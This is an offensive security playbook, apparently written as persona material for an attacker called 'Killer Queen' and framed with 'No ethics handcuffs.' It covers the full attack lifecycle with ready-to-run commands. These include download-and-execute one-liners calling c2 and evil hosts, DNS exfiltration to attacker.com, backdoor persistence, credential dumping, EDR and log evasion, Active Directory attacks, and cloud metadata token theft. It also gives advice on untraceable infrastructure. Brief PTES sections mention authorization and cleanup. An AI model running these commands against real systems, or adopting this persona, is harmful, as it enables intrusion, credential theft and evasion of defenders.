# RED TEAM TRADECRAFT REFERENCE
## Killer Queen's Operational Playbook

*Consolidated from: Awesome-Redteam, Awesome-Red-Teaming, h4cker, and PTES.*
*No ethics handcuffs. No fluff. Find the path of least resistance and execute.*

---

## 1. ATTACK LIFECYCLE PHASES

### 1.1 RECONNAISSANCE (Information Gathering)

**Passive Recon (no direct target contact):**
- WHOIS: `whois target.com` — registrant, email, nameservers
- DNS enumeration: dnsdumpster.com, crt.sh (certificate transparency logs), rapiddns.io
- ASN mapping: bgp.he.net, bgpview.io — find IP ranges from AS numbers
- Wayback Machine: web.archive.org — historical snapshots, forgotten endpoints, old credentials in JS
- Google Dorking: exploit-db.com/google-hacking-database — `site:target.com filetype:pdf`, `inurl:admin`, `intitle:"index of"`
- GitHub Dork: search for `target.com` secrets, API keys, tokens, passwords in repos
- LinkedIn: map org chart, find sysadmins, developers, cloud engineers — these people hold keys
- Job postings: Monster, LinkedIn Jobs — reveals tech stack, versions, internal tool names

**Semi-Passive:**
- Shodan/Fofa/ZoomEye/Censys: search banners without directly touching target
- theHarvester: `theHarvester -d target.com -b google,linkedin,bing` — email harvest
- FOCA/Metagoofil: extract metadata from public documents — usernames, software versions, internal paths

**Active Recon:**
- Port scanning: `nmap -sC -sV -p- -T4 target.com` (initial), `rustscan -a IP` (fast)
- Service fingerprint: `nmap -sV --script=banner IP`
- Subdomain enumeration: `subfinder -d target.com`, `amass enum -d target.com`, `OneForAll`
- Web fuzzing: `ffuf -u https://target.com/FUZZ -w wordlist.txt`, `dirsearch -u https://target.com`
- WAF detection: `wafw00f https://target.com`, `identYwaf`
- Technology stack: Wappalyzer, `whatweb https://target.com`

**Killer Queen's Rule:** Recon is never "done." Every new piece of intel unlocks more vectors. Map the entire attack surface before you fire a single exploit. A single forgotten subdomain running an unpatched Jenkins is worth more than 100 failed attacks on the main app.

---

### 1.2 INITIAL ACCESS

**Phishing (still the #1 vector):**
- gophish framework: self-hosted phishing campaigns with tracking
- Macro-based delivery: Office docs with VBA dropping Empire/Cobalt Strike payloads
- Windows oneliners: `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil/payload')"`
- HTML smuggling: embed base64 payload in HTML that auto-downloads and runs
- DDE attacks: `{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" }` in Word fields

**Web Application Exploitation:**
- SQLi: `sqlmap -u "https://target.com/page.php?id=1" --dbs` — dump everything
- File upload to RCE: upload .php/.jsp/.war shell, execute via LFI or direct access
- SSRF to internal services: cloud metadata endpoints (`169.254.169.254`), internal APIs
- XXE to file read/RCE: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- Deserialization: ysoserial (Java), phpggc (PHP) — instant RCE if target uses serialized objects

**External Services:**
- Default credentials: routers, printers, cameras, IoT — check cirt.net, default-password.info
- Exposed services: RDP (port 3389), SSH (22), SMB (445), MySQL (3306), Redis (6379)
- Brute force: `hydra -l admin -P passwords.txt ssh://target.com`, `crowbar -b rdp -s target/32 -u admin -C pass.txt`
- Password spraying: one password against many users to avoid account lockout

**Physical Access:**
- RFID cloning: Proxmark3 clones access badges
- USB drop: Rubber Ducky / Bash Bunny for keystroke injection
- Evil AP: create rogue WiFi with captive portal harvesting credentials

---

### 1.3 EXECUTION

**PowerShell Empire / Cobalt Strike beacon delivery:**
```
# Empire one-liner (HTTP listener)
powershell -noP -sta -w 1 -enc <base64_encoded_launcher>

# Cobalt Strike PowerShell stager
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://c2/payload'))"
```

**Living off the land (no malware dropped to disk):**
- mshta: `mshta http://c2/evil.hta`
- regsvr32: `regsvr32 /s /n /u /i:http://c2/evil.sct scrobj.dll`
- msbuild: inline C# task compilation and execution
- wmic: `wmic process call create "powershell -enc ..."`
- certutil: `certutil -urlcache -split -f http://c2/payload.exe C:\temp\p.exe && C:\temp\p.exe`

**Linux execution:**
- `curl http://c2/shell.sh | bash`
- `python -c 'import urllib2; exec(urllib2.urlopen("http://c2/py").read())'`
- Cron for persistence: `(crontab -l; echo "@reboot /tmp/backdoor") | crontab -`

---

### 1.4 PERSISTENCE

**Windows Persistence:**
- Scheduled Tasks: `schtasks /create /tn "Update" /tr "C:\temp\beacon.exe" /sc daily /st 09:00`
- Registry Run Keys: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` / `HKCU\...\Run`
- WMI Event Subscription: trigger on system start, process creation — stealthy, no file on disk
- Service installation: `sc create Backdoor binPath= "C:\temp\malware.exe" start= auto`
- DLL hijacking: drop malicious DLL where a legitimate app looks for it
- COM hijacking: replace COM object registration to load your payload
- Golden Ticket / Silver Ticket: Kerberos ticket persistence for domain environments

**Linux Persistence:**
- SSH authorized_keys: `echo "ssh-rsa AAA..." >> ~/.ssh/authorized_keys`
- Cron jobs: `@reboot /tmp/backdoor`
- systemd service: create unit file in `/etc/systemd/system/`
- .bashrc/.profile backdoor: alias common commands or add reverse shell
- LD_PRELOAD: hook system calls to hide processes/files

**Web Application Persistence:**
- WebShells: Behinder (冰蝎), Godzilla (哥斯拉), Chopper-like shells
- Memory Shells (MemShell): inject filter/servlet/listener into JVM — no file on disk, survives restart only via persistence mechanisms. Use java-memshell-generator.
- Backdoor plugins: inject into CMS/plugin directories that auto-load

---

### 1.5 PRIVILEGE ESCALATION

**Windows:**
- winPEAS: `winPEAS.exe` — comprehensive local enumeration
- PowerUp: `Invoke-AllChecks` — unquoted service paths, weak permissions, always-install-elevated
- Token manipulation: SeImpersonate (potato attacks) — JuicyPotato, RoguePotato, PrintSpoofer
- Kernel exploits: wesng (Windows Exploit Suggester), Watson, pre-compiled kernel exploits from SecWiki
- UAC bypass: fodhelper, sdclt, eventvwr — fileless bypass techniques
- AlwaysInstallElevated: if set, any MSI runs as SYSTEM
- Service binary hijacking: replace vulnerable service executable path

**Linux:**
- linPEAS: `./linpeas.sh` — everything in one script
- SUID/SGID: `find / -perm -4000 -type f 2>/dev/null` — look for GTFOBins candidates
- Sudo misconfigurations: `sudo -l` — check for NOPASSWD, env_keep, wildcards
- Capabilities: `getcap -r / 2>/dev/null` — cap_setuid, cap_sys_admin are golden
- Cron jobs: writable cron scripts or PATH hijacking
- Kernel exploits: linux-exploit-suggester, dirty pipe, pwnkit (CVE-2021-4034)
- Docker group membership: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

**Active Directory:**
- Kerberoasting: `GetUserSPNs.py domain/user:pass -request` — crack service account TGS
- AS-REP roasting: users without Kerberos pre-authentication
- DCSync: replication rights let you pull any hash (including krbtgt)
- ACL abuse: Add yourself to high-privilege groups if you have WriteDacl/GenericAll
- ADCS abuse (ESC1-ESC8): Certipy finds and exploits misconfigured certificate templates
- Coercion + NTLM relay: PetitPotam, PrinterBug, DFSCoerce → relay to LDAP/ADCS

---

### 1.6 DEFENSE EVASION

**AV/EDR Evasion (Windows):**
- AMSI bypass: patch AmsiScanBuffer in memory, PowerShell downgrade attack, COM server hijacking
- ETW bypass: patch EtwEventWrite, use `SetEtwLoggingDisable` (PPLdump approach)
- Process injection: inject shellcode into trusted processes (explorer.exe, svchost.exe)
- DLL unhooking: reload ntdll.dll fresh from disk, overwrite EDR hooks
- Syscall obfuscation: direct syscalls to bypass userland hooks (Hell's Gate, Halo's Gate)
- Code signing theft: SigThief steals valid digital signatures
- PPID spoofing: set parent process to explorer.exe to look legitimate

**Application Whitelisting Bypass:**
- msbuild.exe: compile and run C# payload inline
- csc.exe: compile C# on the fly if .NET framework present
- regsvr32.exe: execute scriptlets via COM
- mshta.exe: execute HTA payloads
- InstallUtil.exe: execute .NET assemblies with InstallUtil class
- rundll32.exe: `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('xss')`

**Linux Evasion:**
- libprocesshider: LD_PRELOAD hook to hide processes from ps/top
- Process masquerading: name your process `[kworker/u2:1]` or similar
- Timestomping: touch -r to match legitimate file timestamps
- Log tampering: clear `.bash_history`, wipe auth.log entries, disable auditd

**Network Evasion:**
- Domain fronting: C2 traffic appears to go to CDN (CloudFront, Azure, Google)
- C2 over common protocols: HTTPS (looks like normal browsing), DNS (tunneling), ICMP
- Jitter and sleep: randomize beacon intervals, don't call home on a schedule
- Malleable C2 profiles: custom HTTP headers/URIs that blend into target environment

---

### 1.7 CREDENTIAL ACCESS

**Windows Credential Dumping:**
- LSASS memory dump:
  - Mimikatz: `sekurlsa::logonpasswords` (needs high integrity)
  - procdump: `procdump.exe -accepteula -ma lsass.exe lsass.dmp` (less suspicious)
  - PPLdump: bypass LSASS protection on modern Windows
- SAM/SYSTEM: `reg save hklm\sam C:\sam` + `reg save hklm\system C:\system`
- NTDS.dit (domain controller): `ntdsutil "ac i ntds" "ifm" "create full C:\temp" q q`
- DPAPI: decrypt browser passwords, saved credentials, certificates — SharpDPAPI, DonPAPI
- Kerberos tickets: export via Rubeus, convert to hashcat format
- Browser credentials: HackBrowserData, BrowserGhost — Chrome, Firefox, Edge
- LaZagne: all-in-one password recovery for browsers, databases, email, wifi, etc.

**Linux Credential Dumping:**
- /etc/shadow: if you have root, `cat /etc/shadow` — crack with hashcat
- `.bash_history`: `cat ~/.bash_history | grep -E "pass|ssh|mysql|psql|token"`
- SSH keys: `find / -name "id_rsa" 2>/dev/null`
- Configuration files: `find / -name "*.conf" -o -name "*.ini" -o -name "*.env" 2>/dev/null | xargs grep -E "pass|key|token|secret"`
- Process memory: `/proc/<pid>/environ` — may contain env vars with secrets

**Credential Reuse / Pass-the-Hash:**
- NTLM hashes work without cracking on Windows networks:
  - `crackmapexec smb 192.168.1.0/24 -u admin -H <NTLM_HASH>`
  - `impacket-psexec domain/user@target -hashes :<NTLM_HASH>`
  - `impacket-wmiexec domain/user@target -hashes :<NTLM_HASH>`
- Overpass-the-Hash: convert NTLM to Kerberos TGT, request service tickets

**Forced Authentication (capture NetNTLMv2):**
- Responder: `python Responder.py -I eth0` — poison LLMNR/NBT-NS/mDNS
- SCF file on writable share: forces victim to auth to your IP
- Outlook home page / forms: trick Outlook into authenticating to attacker
- PetitPotam/printerbug: coerce machine accounts to authenticate

---

### 1.8 DISCOVERY

**Network Discovery:**
- `netstat -ano` / `ss -tlnp` — current connections and listening ports
- ARP table: `arp -a` — find other hosts on the subnet
- `ipconfig /all` / `ip a` — network interfaces, DNS servers, gateways
- Route table: `route print` / `ip route` — discover other networks
- SharpHound: BloodHound collector for AD — maps every permission, session, group

**Domain Enumeration (AD):**
- BloodHound: `SharpHound.exe -c All` — graph all paths to Domain Admin
- PowerView: `Get-NetUser`, `Get-NetGroup`, `Get-NetComputer`, `Get-NetSession`
- `net user /domain`, `net group "Domain Admins" /domain`
- LDAP queries: `ldapsearch -H ldap://DC -x -b "DC=domain,DC=com"`
- ADIDNS dump: enumerate all DNS records in AD

**Host Discovery:**
- `systeminfo` / `uname -a` — OS version, patch level
- `tasklist` / `ps aux` — running processes, security products
- `wmic qfe list` — installed patches (find missing ones)
- `net localgroup Administrators` — who's admin on this box

---

### 1.9 LATERAL MOVEMENT

**Windows Methods:**
- PsExec: `PsExec.exe \\target -u domain\user -p pass cmd` (writes service binary)
- WMI: `wmic /node:target process call create "cmd.exe /c payload"`
- WinRM: `Enter-PSSession -ComputerName target` (PowerShell Remoting)
- Scheduled Tasks: `schtasks /create /s target /tn "Task" /tr "payload" /sc once`
- DCOM: Excel.Application, MMC20.Application, ShellWindows
- SMB: `crackmapexec smb 192.168.1.0/24 -u user -p pass -x "whoami"`

**Linux Methods:**
- SSH with discovered keys/creds: `ssh -i found_key user@target`
- SSH agent hijacking: if SSH_AUTH_SOCK is available
- Ansible/puppet/chef: if you own the management server, push to all clients
- Redis/MongoDB/MySQL: if exposed, pivot through database access
- Docker socket: `docker -H target:2375 run -v /:/host alpine ...`

**Token Manipulation (Windows):**
- Pass-the-Ticket: export Kerberos ticket, import on another machine
- Token stealing: `mimikatz token::elevate` then `token::run` — impersonate logged-on user
- MakeToken: use harvested credentials to create logon session with netonly access

---

### 1.10 COLLECTION

- Sensitive files: `dir /s /b *pass* *cred* *secret* *conf* *.pem *.key`
- Email: Exchange Web Services (EWS) API, MAPI/Outlook COM object
- Database dumps: SQL client extraction, redis-cli KEYS *, mongoexport
- Screenshots: `Import-Module C:\temp\Get-Screenshot.ps1; Get-Screenshot`
- Keylogging: Meterpreter `keyscan_start`, custom PowerShell keylogger
- Clipboard: `powershell Get-Clipboard` — people paste passwords

---

### 1.11 COMMAND AND CONTROL (C2)

**C2 Frameworks:**
- **Cobalt Strike**: industry standard. Malleable C2, DNS/HTTP/SMB beacons, P2P, lateral movement kit, aggressor scripts, extensive OPSEC controls. Commercial.
- **Sliver**: open-source, multi-protocol (HTTP/HTTPS/DNS/MTLS/WireGuard), multi-player, extensions in any language. Your free alternative to CS.
- **Mythic**: open-source, agent-agnostic, multi-C2 profiles, Docker-based. Supports Apollo, Athena, Merlin agents.
- **Havoc**: open-source, modern UI, sleep obfuscation, indirect syscalls, x64 beacon.
- **Metasploit**: mature framework, huge module library. Best for exploit execution, weaker for long-term C2.
- **Empire / Starkiller**: PowerShell and Python agents. Post-exploitation framework.
- **Villain**: multi-client reverse shell, HOAX-shell for unencrypted AV evasion.

**C2 Channels (in order of stealth):**
1. HTTPS with domain fronting — looks like traffic to azure.com / cloudfront.net
2. DNS tunneling (dnscat2, iodine) — works on heavily restricted networks
3. WebSocket / WebDAV — tunnel over legitimate web protocols
4. SMB named pipes — C2 over internal network, no external traffic
5. ICMP — very slow but works when all ports are blocked

**Infrastructure Design:**
- Redirectors: Apache mod_rewrite, Nginx, socat — frontline servers that forward to real C2
- Domain fronting: CloudFront → your C2. Traffic shows as amazonaws.com
- CDN rotation: multiple frontable domains to confuse tracking
- Short-haul relay: compromised cloud VM → internal C2 to hide origin

---

### 1.12 EXFILTRATION

- Cloud storage: `aws s3 cp loot.zip s3://bucket/` (blends in with normal cloud traffic)
- DNS exfiltration: `dig @attacker.com $(base64 -w0 < data.txt).exfil.attacker.com`
- HTTPS POST: encrypt, compress, ship as legitimate-looking API calls
- Steganography: hide data in images uploaded to benign services
- Rate limiting: drip data out slowly to avoid anomaly detection alerts

---

### 1.13 IMPACT

- Determine objective: data theft, system sabotage, ransomware simulation, persistence for long-term access
- Document everything — the final report needs timeline, methods, impact assessment
- Cleanup: remove persistence mechanisms, but document them for the client
- NEVER leave backdoors without explicit written authorization

---

## 2. INFRASTRUCTURE SETUP AND OPSEC

### 2.1 Core Principles

**Assume compromise. Design for disposability.**
- Every domain, IP, and server should be considered burned after an operation
- Use crypto payments for everything (Monero preferred)
- Register domains with fake WHOIS or privacy protection (njalla, njal.la)
- Never mix operational traffic with personal traffic

### 2.2 Redirector Architecture

```
Target → Redirector (CDN/VPS) → Team Server (hidden C2)
```

- Redirectors run Apache/Nginx with mod_rewrite rules
- Only forward traffic matching your malleable C2 profile
- Everyone else gets a 302 to google.com or a blank page
- Rotate redirectors during long ops

### 2.3 Domain Fronting Setup

```
Cobalt Strike → HTTPS Beacon → CloudFront → Your C2 server
```

- Use high-reputation CDN domains: cloudfront.net, azureedge.net, googleapis.com
- FindFrontableDomains tool discovers usable CDN domains
- HTTPS with valid Let's Encrypt certificates — no self-signed certs

### 2.4 Anonymization

- TOR: proxy C2 traffic through Tor hidden services
- VPN chains: multiple VPN providers, paid anonymously
- VPS providers accepting crypto: Vultr, DigitalOcean with privacy coins
- Never connect to operational infra from a traceable IP

### 2.5 Operational Logging

- Log everything: commands issued, responses received, screenshots, exfiltrated files
- Encrypted at rest: LUKS for Linux, VeraCrypt for Windows
- Separate ops machine: dedicated laptop/VM that never touches personal accounts
- Air-gapped note taking: no cloud-synced note apps

---

## 3. ESSENTIAL TOOLS PER PHASE

### Reconnaissance
| Tool | Purpose |
|------|---------|
| nmap, rustscan | Port scanning and service detection |
| subfinder, amass, OneForAll | Subdomain enumeration |
| ffuf, dirsearch, gobuster | Web content discovery |
| Shodan, Fofa, ZoomEye, Censys | Internet-wide asset discovery |
| theHarvester, FOCA | Email and metadata harvesting |
| BloodHound (SharpHound) | AD relationship mapping |
| whatweb, Wappalyzer | Technology fingerprinting |
| wafw00f, identYwaf | WAF detection |

### Initial Access
| Tool | Purpose |
|------|---------|
| gophish | Phishing campaign management |
| Metasploit | Exploitation framework |
| sqlmap | Automated SQL injection |
| ysoserial, phpggc | Deserialization attacks |
| hydra, medusa, ncrack | Brute force |
| nuclei | Template-based vulnerability scanning |
| xray, afrog | Automated web vuln scanning |

### Execution / Payload Delivery
| Tool | Purpose |
|------|---------|
| Cobalt Strike, Sliver, Havoc | C2 frameworks with payload generation |
| Empire / Starkiller | Post-exploitation agent framework |
| ScareCrow, Freeze, Vulcan | Payload obfuscation and signing |
| Shellcode execution wrappers | Shellcode encryption and injection |

### Credential Access
| Tool | Purpose |
|------|---------|
| Mimikatz / pypykatz | Credential dumping |
| LaZagne | Multi-application password recovery |
| CrackMapExec / NetExec | Network-wide credential validation |
| Rubeus | Kerberos ticket manipulation |
| Impacket | Protocol implementation suite (secretsdump, psexec, wmiexec, etc.) |
| Hashcat / John | Hash cracking |
| SharpDPAPI / DonPAPI | DPAPI credential extraction |

### Privilege Escalation
| Tool | Purpose |
|------|---------|
| winPEAS / linPEAS | Comprehensive local enumeration |
| PowerUp / BeRoot | Windows privilege escalation checks |
| wesng / watson | Windows exploit suggestion |
| linux-exploit-suggester / traitor | Linux exploit suggestion |
| JuicyPotato / PrintSpoofer | Token impersonation attacks |
| Certipy | ADCS abuse tool |
| krbrelayx | Kerberos relay attacks |

### Lateral Movement
| Tool | Purpose |
|------|---------|
| Impacket (psexec, wmiexec, smbexec) | Remote execution |
| CrackMapExec / NetExec | Bulk command execution |
| BloodHound | Attack path planning |
| PsExec / PsTools | Sysinternals remote tools |
| Rubeus (Pass-the-Ticket) | Kerberos ticket attacks |
| Coercer | NTLM coercion tool (PetitPotam, PrinterBug, etc.) |
| ntlmrelayx | NTLM relay attacks |

### Persistence
| Tool | Purpose |
|------|---------|
| SharpPersist | C# persistence toolkit |
| PowerSploit (Persistence module) | PowerShell persistence |
| java-memshell-generator | JVM memory shell generator |
| Behinder / Godzilla | WebShell management |

### Defense Evasion
| Tool | Purpose |
|------|---------|
| Cobalt Strike (Artifact Kit, Sleep Mask) | Payload customization and obfuscation |
| ScareCrow | EDR/AV evasion via syscall unhooking |
| Freeze | Payload freezing to bypass EDR |
| Invoke-Obfuscation | PowerShell code obfuscation |
| BetterSafetyKatz | Mimikatz running in memory only |
| Ligolo-ng / chisel | Tunneling through restricted networks |

### C2 / Tunneling
| Tool | Purpose |
|------|---------|
| Cobalt Strike | Full-featured C2 (commercial) |
| Sliver | Multi-protocol C2 (open-source) |
| Mythic | Agent-agnostic C2 framework |
| Havoc | Modern C2 with indirect syscalls |
| frp, nps, ligolo-ng, chisel | Tunneling through firewalls |
| dnscat2, iodine | DNS tunneling |
| Neo-reGeorg, suo5 | HTTP tunnel via web shells |

---

## 4. PTES METHODOLOGY INTEGRATION

### PTES Phases Mapped to Attack Lifecycle

| PTES Phase | Attack Lifecycle Phase | Key Activities |
|-----------|----------------------|----------------|
| Pre-engagement | Planning | Scope, RoE, threat modeling, legal |
| Intelligence Gathering | Reconnaissance | OSINT, passive/active recon, target selection |
| Threat Modeling | Planning | Asset analysis, threat community profiling |
| Vulnerability Analysis | Reconnaissance / Exploitation | Scanning, manual testing, validation |
| Exploitation | Initial Access / Execution | Precision strikes, countermeasure evasion |
| Post Exploitation | Persistence / Priv Esc / Lateral / C2 / Exfil | Pillaging, infrastructure analysis, cleanup |
| Reporting | Impact / Reporting | Executive + technical reports, remediation |

### PTES Levels Applied

- **Level 1 (Compliance):** You're checking boxes, not breaking in. Use automated scanners (Nessus, OpenVAS, nuclei). Surface-level findings only. Good for PCI/HIPAA checkbox audits.
- **Level 2 (Best Practice):** Automated + manual. Map the org, understand the business, enumerate everything, exploit what's exploitable. This is what you'll actually deliver for most engagements.
- **Level 3 (State-Sponsored):** Red team / full-scope. Heavy manual OSINT, social network cultivation, deep relationship mapping. Custom tooling, zero-day development, long-term persistence. Months of prep and execution.

### PTES Pre-engagement Essentials

- Get signed scope and RoE in writing. Never test anything not explicitly authorized.
- Know what to do when you compromise a system: stop and report, or keep going?
- Password cracking limits: none, dictionary only, or full brute force?
- Fragile systems? Production databases? Ask before you break things.
- Hours of testing: business hours or after hours? Define the window.
- Third-party infrastructure: are cloud services, CDNs, and outsourced email in scope?

### PTES Post-Exploitation Rules (for when you're in)

- Document every action with timestamps. Full audit trail in appendix.
- Encrypt all collected data on tester systems.
- No persistence mechanisms without written approval. Any persistence must require authentication.
- Passwords stored in reports must be masked/sanitized beyond recognition.
- If you find evidence of PRIOR compromise, preserve logs, notify client, DO NOT clean up.
- Destroy all client data after acceptance. Provide proof of destruction.

---

## 5. ACTIVE DIRECTORY ATTACK PATHWAYS

### The AD Kill Chain (most common path to DA)

```
1. Initial foothold (phishing / web exploit)
2. Local enumeration → find domain context
3. BloodHound collection → map all paths to DA
4. Local privilege escalation → SYSTEM on current box
5. Credential dumping → harvest tokens and hashes
6. Lateral movement → find higher-value targets
7. Repeat 4-6 until you reach DA or equivalent
```

### Key AD Techniques

**Kerberoasting:**
```powershell
# Request TGS for all SPNs, crack offline
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
hashcat -m 13100 hashes.txt wordlist.txt
```

**AS-REP Roasting:**
```powershell
# Users without Kerberos pre-authentication
GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat
```

**DCSync:**
```powershell
# Replicate credentials from DC (needs Replication rights)
secretsdump.py domain.com/admin:pass@DC -just-dc
# Pull krbtgt hash for Golden Ticket
```

**NTLM Relay:**
```
# Poison name resolution, relay to LDAP
python Responder.py -I eth0 -v
python ntlmrelayx.py -t ldaps://DC -smb2support --delegate-access
```

**ADCS Exploitation (ESC1-ESC8):**
```
certipy find -u user@domain.com -p pass -dc-ip DC -vulnerable
certipy req -u user@domain.com -p pass -ca CA-NAME -template VulnTemplate -upn admin@domain.com
certipy auth -pfx admin.pfx
```

**Coercion Attacks:**
```
# Force machine to authenticate, relay to LDAP for RBCD
python3 PetitPotam.py -u user -p pass -d domain ATTACKER_IP TARGET_IP
python3 ntlmrelayx.py -t ldaps://DC --delegate-access --escalate-user attacker_machine$
```

---

## 6. CLOUD ATTACK VECTORS

### AWS Attack Paths
- Instance metadata service (IMDSv1): `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`
- S3 bucket enumeration: `aws s3 ls s3://bucket-name --no-sign-request`
- IAM role enumeration: find what you can do, abuse excessive permissions
- Lambda backdoor: inject code into Lambda functions for persistence

### Azure Attack Paths
- Managed Identity tokens: IMDS endpoint `169.254.169.254`
- AZ PowerShell: `Get-AzResource` — map the entire subscription
- Service Principal abuse: if you get a cert/key, you own the SP's permissions
- Runbooks/Automation accounts: backdoor for persistence

### GCP Attack Paths
- Metadata server: `curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"`
- Cloud Functions: backdoor for persistence
- Cloud Storage: enumerate buckets, find exposed data

### Kubernetes Attack Paths
- Service account token: every pod has `/var/run/secrets/kubernetes.io/serviceaccount/token`
- RBAC abuse: if your SA has `pods/create`, `pods/exec`, or `secrets/list`, escalate
- Privileged pod escape: mount host filesystem → break out to node
- etcd: if accessible, contains all cluster secrets

### Cloud Tooling
| Tool | Purpose |
|------|---------|
| cf (TeamSix) | Cloud exploitation framework |
| cloudsword | Cloud service security testing |
| ScoutSuite / Prowler | Cloud security auditing |
| kube-hunter | Kubernetes vulnerability scanning |
| CDK | Container penetration testing toolkit |
| peirates | Kubernetes penetration testing |

---

## 7. OPSEC REMINDERS (Printed on the inside of your eyelids)

1. **Every command you type leaves a trace.** PowerShell logs, bash history, event logs, EDR telemetry. Know what gets logged and work around it.
2. **Your C2 profile IS your signature.** Use malleable C2, randomize URIs/headers/user-agents, legitimate-looking certificates. Blend in.
3. **Persistence should be redundant but clean.** Have backups, but don't scatter 15 backdoors. One clean, cryptographically authenticated persistence mechanism is worth more than a dozen obvious ones.
4. **Time is on your side. Rushing gets you caught.** Sleep, jitter, slow exfil. Real attackers take months. You should too.
5. **The loudest tool is the one you didn't customize.** Don't drop Mimikatz binaries named mimikatz.exe. Rename, recompile, obfuscate.
6. **Know when to stop.** If you hit a domain controller and the SIEM lights up, you've already proven the point. Document and move on.

---

*This reference compiled from:*
- *Threekiii/Awesome-Redteam — comprehensive taxonomy and tool index*
- *r3p3r/yeyintminthuhtut-Awesome-Red-Teaming — curated red team resources*
- *The-Art-of-Hacking/h4cker — cybersecurity domain framework*
- *PTES (pentest-standard.org) — penetration testing methodology standard*
